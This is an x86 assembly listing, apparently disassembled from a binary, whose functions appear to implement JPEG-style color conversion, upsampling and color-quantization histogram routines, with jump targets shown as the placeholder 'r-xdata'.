sub esp 0x44
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1a0 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x1c ]
mov eax [ edx ]
mov ecx [ ebp + 0x18 ]
lea edx [ ecx + eax * 4 ]
push edx
mov eax [ ebp + 0x10 ]
mov ecx [ eax ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call [ ecx + 0xc ]
add esp 0x10
mov edx [ ebp + 0x1c ]
mov eax [ edx ]
add eax 0x1
mov ecx [ ebp + 0x1c ]
mov [ ecx ] eax
mov edx [ ebp + 0x10 ]
mov eax [ edx ]
add eax 0x1
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4270c0
push ebp
mov ebp esp
sub esp 0x84
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1a0 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x120 ]
mov [ ebp - 0x34 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x10 ]
mov [ ebp - 0x38 ] edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x14 ]
mov [ ebp - 0x3c ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x18 ]
mov [ ebp - 0x40 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x1c ]
mov [ ebp - 0x44 ] edx
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
mov edx [ ebp + 0x10 ]
mov eax [ ecx + edx * 4 ]
mov [ ebp - 0x24 ] eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x4 ]
mov eax [ ebp + 0x10 ]
mov ecx [ edx + eax * 4 ]
mov [ ebp - 0x28 ] ecx
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ eax + ecx * 4 ]
mov [ ebp - 0x2c ] edx
mov eax [ ebp + 0x14 ]
mov ecx [ eax ]
mov [ ebp - 0x20 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x5c ]
shr eax 0x1
mov [ ebp - 0x30 ] eax
jmp r-xdata
cmp [ ebp - 0x30 ] 0x0
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x5c ]
and ecx 0x1
test ecx ecx
je r-xdata
mov edx [ ebp - 0x28 ]
xor eax eax
mov al [ edx ]
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x28 ]
add ecx 0x1
mov [ ebp - 0x28 ] ecx
mov edx [ ebp - 0x2c ]
xor eax eax
mov al [ edx ]
mov [ ebp - 0x1c ] eax
mov ecx [ ebp - 0x2c ]
add ecx 0x1
mov [ ebp - 0x2c ] ecx
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x38 ]
mov ecx [ eax + edx * 4 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x44 ]
mov ecx [ eax + edx * 4 ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x40 ]
add ecx [ eax + edx * 4 ]
sar ecx 0x10
mov [ ebp - 0x10 ] ecx
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x3c ]
mov eax [ edx + ecx * 4 ]
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x24 ]
xor edx edx
mov dl [ ecx ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x24 ]
add eax 0x1
mov [ ebp - 0x24 ] eax
mov ecx [ ebp - 0x8 ]
add ecx [ ebp - 0xc ]
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x34 ]
mov cl [ eax + ecx ]
mov [ edx ] cl
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x34 ]
mov dl [ ecx + edx ]
mov [ eax + 0x1 ] dl
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x34 ]
mov al [ edx + eax ]
mov [ ecx + 0x2 ] al
mov ecx [ ebp - 0x20 ]
add ecx 0x3
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x24 ]
xor eax eax
mov al [ edx ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x24 ]
add ecx 0x1
mov [ ebp - 0x24 ] ecx
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x34 ]
mov dl [ ecx + edx ]
mov [ eax ] dl
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x34 ]
mov al [ edx + eax ]
mov [ ecx + 0x1 ] al
mov ecx [ ebp - 0x8 ]
add ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x34 ]
mov cl [ eax + ecx ]
mov [ edx + 0x2 ] cl
mov edx [ ebp - 0x20 ]
add edx 0x3
mov [ ebp - 0x20 ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x28 ]
xor eax eax
mov al [ edx ]
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x2c ]
xor edx edx
mov dl [ ecx ]
mov [ ebp - 0x1c ] edx
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x38 ]
mov edx [ ecx + eax * 4 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x44 ]
mov edx [ ecx + eax * 4 ]
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x40 ]
add edx [ ecx + eax * 4 ]
sar edx 0x10
mov [ ebp - 0x10 ] edx
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x3c ]
mov ecx [ eax + edx * 4 ]
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x24 ]
xor eax eax
mov al [ edx ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x8 ]
add ecx [ ebp - 0xc ]
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x34 ]
mov cl [ eax + ecx ]
mov [ edx ] cl
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x34 ]
mov dl [ ecx + edx ]
mov [ eax + 0x1 ] dl
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x34 ]
mov al [ edx + eax ]
mov [ ecx + 0x2 ] al
mov ecx [ ebp - 0x30 ]
sub ecx 0x1
mov [ ebp - 0x30 ] ecx
sub_427300
push ebp
mov ebp esp
sub esp 0x8c
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1a0 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x120 ]
mov [ ebp - 0x3c ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x10 ]
mov [ ebp - 0x40 ] edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x14 ]
mov [ ebp - 0x44 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x18 ]
mov [ ebp - 0x48 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x1c ]
mov [ ebp - 0x4c ] edx
mov eax [ ebp + 0x10 ]
shl eax 0x1
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
mov eax [ edx + eax * 4 ]
mov [ ebp - 0x28 ] eax
mov ecx [ ebp + 0x10 ]
shl ecx 0x1
mov edx [ ebp + 0xc ]
mov eax [ edx ]
mov ecx [ eax + ecx * 4 + 0x4 ]
mov [ ebp - 0x2c ] ecx
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x4 ]
mov ecx [ ebp + 0x10 ]
mov edx [ eax + ecx * 4 ]
mov [ ebp - 0x30 ] edx
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0x10 ]
mov eax [ ecx + edx * 4 ]
mov [ ebp - 0x34 ] eax
mov ecx [ ebp + 0x14 ]
mov edx [ ecx ]
mov [ ebp - 0x20 ] edx
mov eax [ ebp + 0x14 ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x24 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x5c ]
shr eax 0x1
mov [ ebp - 0x38 ] eax
jmp r-xdata
cmp [ ebp - 0x38 ] 0x0
jbe r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x5c ]
and eax 0x1
test eax eax
je r-xdata
mov edx [ ebp - 0x30 ]
xor eax eax
mov al [ edx ]
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x30 ]
add ecx 0x1
mov [ ebp - 0x30 ] ecx
mov edx [ ebp - 0x34 ]
xor eax eax
mov al [ edx ]
mov [ ebp - 0x1c ] eax
mov ecx [ ebp - 0x34 ]
add ecx 0x1
mov [ ebp - 0x34 ] ecx
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x40 ]
mov ecx [ eax + edx * 4 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4c ]
mov ecx [ eax + edx * 4 ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x48 ]
add ecx [ eax + edx * 4 ]
sar ecx 0x10
mov [ ebp - 0x10 ] ecx
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x44 ]
mov eax [ edx + ecx * 4 ]
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x28 ]
xor edx edx
mov dl [ ecx ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x28 ]
add eax 0x1
mov [ ebp - 0x28 ] eax
mov ecx [ ebp - 0x8 ]
add ecx [ ebp - 0xc ]
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x3c ]
mov cl [ eax + ecx ]
mov [ edx ] cl
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x3c ]
mov dl [ ecx + edx ]
mov [ eax + 0x1 ] dl
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x3c ]
mov al [ edx + eax ]
mov [ ecx + 0x2 ] al
mov ecx [ ebp - 0x20 ]
add ecx 0x3
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x28 ]
xor eax eax
mov al [ edx ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x28 ]
add ecx 0x1
mov [ ebp - 0x28 ] ecx
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x3c ]
mov dl [ ecx + edx ]
mov [ eax ] dl
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x3c ]
mov al [ edx + eax ]
mov [ ecx + 0x1 ] al
mov ecx [ ebp - 0x8 ]
add ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x3c ]
mov cl [ eax + ecx ]
mov [ edx + 0x2 ] cl
mov edx [ ebp - 0x20 ]
add edx 0x3
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x2c ]
xor ecx ecx
mov cl [ eax ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x2c ]
add edx 0x1
mov [ ebp - 0x2c ] edx
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0x3c ]
mov al [ edx + eax ]
mov [ ecx ] al
mov ecx [ ebp - 0x8 ]
add ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x3c ]
mov cl [ eax + ecx ]
mov [ edx + 0x1 ] cl
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0x14 ]
mov eax [ ebp - 0x24 ]
mov ecx [ ebp - 0x3c ]
mov dl [ ecx + edx ]
mov [ eax + 0x2 ] dl
mov eax [ ebp - 0x24 ]
add eax 0x3
mov [ ebp - 0x24 ] eax
mov ecx [ ebp - 0x2c ]
xor edx edx
mov dl [ ecx ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x2c ]
add eax 0x1
mov [ ebp - 0x2c ] eax
mov ecx [ ebp - 0x8 ]
add ecx [ ebp - 0xc ]
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x3c ]
mov cl [ eax + ecx ]
mov [ edx ] cl
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x24 ]
mov ecx [ ebp - 0x3c ]
mov dl [ ecx + edx ]
mov [ eax + 0x1 ] dl
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0x3c ]
mov al [ edx + eax ]
mov [ ecx + 0x2 ] al
mov ecx [ ebp - 0x24 ]
add ecx 0x3
mov [ ebp - 0x24 ] ecx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x30 ]
xor edx edx
mov dl [ ecx ]
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x34 ]
xor ecx ecx
mov cl [ eax ]
mov [ ebp - 0x1c ] ecx
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x40 ]
mov ecx [ eax + edx * 4 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4c ]
mov ecx [ eax + edx * 4 ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x48 ]
add ecx [ eax + edx * 4 ]
sar ecx 0x10
mov [ ebp - 0x10 ] ecx
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x44 ]
mov eax [ edx + ecx * 4 ]
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x28 ]
xor edx edx
mov dl [ ecx ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x3c ]
mov al [ edx + eax ]
mov [ ecx ] al
mov ecx [ ebp - 0x8 ]
add ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x3c ]
mov cl [ eax + ecx ]
mov [ edx + 0x1 ] cl
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0x14 ]
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x3c ]
mov dl [ ecx + edx ]
mov [ eax + 0x2 ] dl
mov eax [ ebp - 0x2c ]
xor ecx ecx
mov cl [ eax ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x24 ]
mov ecx [ ebp - 0x3c ]
mov dl [ ecx + edx ]
mov [ eax ] dl
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0x3c ]
mov al [ edx + eax ]
mov [ ecx + 0x1 ] al
mov ecx [ ebp - 0x8 ]
add ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x3c ]
mov cl [ eax + ecx ]
mov [ edx + 0x2 ] cl
mov ecx [ ebp - 0x38 ]
sub ecx 0x1
mov [ ebp - 0x38 ] ecx
sub_427640
push ebp
mov ebp esp
sub esp 0x4c
push ebx
push esi
push edi
push 0x2c
push 0x1
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
call [ edx ]
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x1a8 ] ecx
mov edx [ ebp - 0x4 ]
mov [ edx ] sub_427920
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] sub_429250
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x20 ] 0x0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x64 ] 0x3
je r-xdata
push 0x80
push 0x1
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
call [ edx ]
add esp 0xc
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x18 ] eax
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x2f
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx ]
add esp 0x4
cmp [ ebp - 0x8 ] 0x20
jge r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1c ] 0x1
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x5a ]
test ecx ecx
je r-xdata
push 0x1000
push 0x1
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
call [ edx + 0x4 ]
add esp 0xc
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x18 ]
mov ecx [ ebp - 0x8 ]
mov [ edx + ecx * 4 ] eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x10 ] 0x0
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x54 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x8
jge r-xdata
mov edx [ ebp - 0x8 ]
add edx 0x1
mov [ ebp - 0x8 ] edx
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x4c ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4c ] 0x2
cmp [ ebp - 0xc ] 0x100
jle r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x38
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x18 ] 0x8
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x5c ]
add eax 0x2
imul eax eax 0x6
push eax
push 0x1
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x4 ]
call [ eax + 0x4 ]
add esp 0xc
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x20 ] eax
mov edx [ ebp + 0x8 ]
push edx
call sub_427810
add esp 0x4
push 0x3
mov eax [ ebp - 0xc ]
push eax
push 0x1
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x4 ]
call [ eax + 0x8 ]
add esp 0x10
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x10 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
mov [ edx + 0x14 ] eax
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x39
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x18 ] 0x100
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx ]
add esp 0x4
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x4c ] 0x0
je r-xdata
sub_427810
push ebp
mov ebp esp
sub esp 0x50
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1a8 ]
mov [ ebp - 0x4 ] ecx
push 0x7fc
push 0x1
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
call [ ecx ]
add esp 0xc
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
add edx 0x3fc
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov [ eax + 0x28 ] ecx
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
jmp r-xdata
cmp [ ebp - 0xc ] 0x10
jge r-xdata
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
mov [ edx + ecx * 4 ] eax
mov ecx [ ebp - 0x10 ]
neg ecx
mov edx [ ebp - 0xc ]
neg edx
mov eax [ ebp - 0x8 ]
mov [ eax + edx * 4 ] ecx
jmp r-xdata
cmp [ ebp - 0xc ] 0x30
jge r-xdata
mov edx [ ebp - 0xc ]
add edx 0x1
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x10 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
mov [ edx + ecx * 4 ] eax
mov ecx [ ebp - 0x10 ]
neg ecx
mov edx [ ebp - 0xc ]
neg edx
mov eax [ ebp - 0x8 ]
mov [ eax + edx * 4 ] ecx
jmp r-xdata
cmp [ ebp - 0xc ] 0xff
jg r-xdata
mov ecx [ ebp - 0xc ]
add ecx 0x1
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0xc ]
and edx 0x1
neg edx
sbb edx edx
inc edx
mov eax [ ebp - 0x10 ]
add eax edx
mov [ ebp - 0x10 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x10 ]
mov [ eax + edx * 4 ] ecx
mov edx [ ebp - 0x10 ]
neg edx
mov eax [ ebp - 0xc ]
neg eax
mov ecx [ ebp - 0x8 ]
mov [ ecx + eax * 4 ] edx
jmp r-xdata
mov ecx [ ebp - 0xc ]
add ecx 0x1
mov [ ebp - 0xc ] ecx
sub_427920
push ebp
mov ebp esp
sub esp 0x50
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1a8 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x18 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x4c ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
and eax 0xff
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4c ] 0x2
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x4c ] 0x2
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x4 ] sub_427ad0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] sub_428780
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x4 ] sub_427bb0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] sub_4283a0
jmp r-xdata
mov eax [ ebp - 0x4 ]
xor ecx ecx
mov cl [ eax + 0x1c ]
test ecx ecx
je r-xdata
cmp [ ebp - 0xc ] 0x100
jle r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x38
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x18 ] 0x1
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x8 ] sub_4318b0
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x70 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x1
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4c ] 0x2
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x39
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x18 ] 0x100
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx ]
add esp 0x4
cmp [ ebp - 0xc ] 0x20
jge r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x5c ]
add edx 0x2
imul edx edx 0x6
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] 0x0
push 0x1000
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + eax * 4 ]
push edx
call sub_420d70
add esp 0x8
jmp r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x20 ]
push edx
call sub_420d70
add esp 0x8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x10 ]
push ecx
push 0x1
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
call [ ecx + 0x4 ]
add esp 0xc
mov edx [ ebp - 0x4 ]
mov [ edx + 0x20 ] eax
mov edx [ ebp - 0xc ]
add edx 0x1
mov [ ebp - 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x24 ] 0x0
mov ecx [ ebp + 0x8 ]
push ecx
call sub_427810
add esp 0x4
sub_427ad0
push ebp
mov ebp esp
sub esp 0x5c
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1a8 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x18 ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x5c ]
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x14 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x14 ]
cmp ecx [ ebp + 0x14 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x14 ]
mov eax [ ebp + 0xc ]
mov ecx [ eax + edx * 4 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x1c ]
mov [ ebp - 0x18 ] edx
jmp r-xdata
cmp [ ebp - 0x18 ] 0x0
jbe r-xdata
jmp r-xdata
mov ecx [ ebp - 0x8 ]
xor edx edx
mov dl [ ecx ]
sar edx 0x3
mov eax [ ebp - 0x8 ]
xor ecx ecx
mov cl [ eax + 0x1 ]
sar ecx 0x2
shl ecx 0x6
mov eax [ ebp - 0x10 ]
mov edx [ eax + edx * 4 ]
add edx ecx
mov eax [ ebp - 0x8 ]
xor ecx ecx
mov cl [ eax + 0x2 ]
sar ecx 0x3
lea edx [ edx + ecx * 2 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0xc ]
mov cx [ eax ]
add cx 0x1
mov edx [ ebp - 0xc ]
mov [ edx ] cx
mov eax [ ebp - 0xc ]
xor ecx ecx
mov cx [ eax ]
test ecx ecx
jg r-xdata
mov eax [ ebp - 0x14 ]
add eax 0x1
mov [ ebp - 0x14 ] eax
mov edx [ ebp - 0x8 ]
add edx 0x3
mov [ ebp - 0x8 ] edx
jmp r-xdata
mov edx [ ebp - 0xc ]
mov ax [ edx ]
sub ax 0x1
mov ecx [ ebp - 0xc ]
mov [ ecx ] ax
mov eax [ ebp - 0x18 ]
sub eax 0x1
mov [ ebp - 0x18 ] eax
sub_427bb0
push ebp
mov ebp esp
sub esp 0x6c
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1a8 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x18 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x5c ]
mov [ ebp - 0x2c ] edx
mov [ ebp - 0x24 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x24 ]
cmp ecx [ ebp + 0x14 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x24 ]
mov eax [ ebp + 0xc ]
mov ecx [ eax + edx * 4 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x24 ]
mov eax [ ebp + 0x10 ]
mov ecx [ eax + edx * 4 ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x2c ]
mov [ ebp - 0x28 ] edx
jmp r-xdata
cmp [ ebp - 0x28 ] 0x0
jbe r-xdata
jmp r-xdata
mov ecx [ ebp - 0xc ]
xor edx edx
mov dl [ ecx ]
sar edx 0x3
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0xc ]
add eax 0x1
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0xc ]
xor edx edx
mov dl [ ecx ]
sar edx 0x2
mov [ ebp - 0x1c ] edx
mov eax [ ebp - 0xc ]
add eax 0x1
